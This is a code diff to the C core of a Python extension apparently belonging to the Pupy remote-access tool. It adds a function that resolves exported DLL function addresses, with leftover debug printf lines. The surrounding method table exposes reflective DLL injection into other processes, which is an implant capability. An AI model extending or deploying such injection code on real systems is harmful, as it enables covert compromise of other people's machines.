@@ -69,12 +69,30 @@ static PyObject *Py_load_dll(PyObject *self, PyObject *args)
 	return PyBool_FromLong(0);
 }
 
+static PyObject *Py_find_function_address(PyObject *self, PyObject *args)
+{
+	const char *lpDllName = NULL;
+	const char *lpFuncName = NULL;
+	void *address = NULL;
+	printf("DEBUG 0: %s %s\n", lpDllName, lpFuncName);
+
+	if (PyArg_ParseTuple(args, "ss", &lpDllName, &lpFuncName)) {
+		printf("DEBUG: %s %s\n", lpDllName, lpFuncName);
+		address = MyFindProcAddress(lpDllName, lpFuncName);
+	}
+
+	printf("DEBUG 2: %s %s %p\n", lpDllName, lpFuncName, address);
+	return PyLong_FromVoidPtr(address);
+}
+
 static PyMethodDef methods[] = {
 	{ "get_pupy_config", Py_get_pupy_config, METH_NOARGS, "get_pupy_config() -> string" },
 	{ "get_arch", Py_get_arch, METH_NOARGS, "get current pupy architecture (x86 or x64)" },
 	{ "_get_compressed_library_string", Py_get_compressed_library_string, METH_VARARGS },
 	{ "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, "reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure" },
 	{ "load_dll", Py_load_dll, METH_VARARGS, "load_dll(dllname, raw_dll) -> bool" },
+	{ "find_function_address", Py_find_function_address, METH_VARARGS,
+	  "find_function_address(dllname, function) -> address" },
 	{ NULL, NULL },		/* Sentinel */
 };
 
@@ -83,4 +101,3 @@ initpupy(void)
 {
 	Py_InitModule3("pupy", methods, module_doc);
 }
-
